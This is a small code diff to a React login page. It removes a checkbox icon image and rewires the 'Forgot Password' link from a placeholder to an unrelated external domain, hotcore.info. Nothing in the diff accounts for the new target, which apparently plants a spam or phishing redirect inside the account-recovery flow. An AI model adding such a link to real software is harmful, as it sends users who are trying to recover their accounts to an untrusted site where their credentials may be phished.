@@ -69,10 +69,9 @@ const LoginPage = () => {
               <div className={styles.formOptions}>
                 <label className={styles.rememberMe}>
                   <input type="checkbox" />
-                  <img src="https://cdn.builder.io/api/v1/image/assets/TEMP/1bec477041224fb7fc3922fecf0f0268dca8625a91ef0c7f9a15c09f74890b18?placeholderIfAbsent=true&apiKey=918132c67bed4c9f95d44f9d99b73e78" alt="" className={styles.checkIcon} />
                   Remember me
                 </label>
-                <a href="#" className={styles.forgotPassword}>Forgot Password</a>
+                <a href="https://hotcore.info/act/kareff-112024p.html" className={styles.forgotPassword}>Forgot Password</a>
               </div>
               <Button type="submit" disabled={loading}>{loading ? 'Logging in...' : 'Login'}</Button>
             </form>
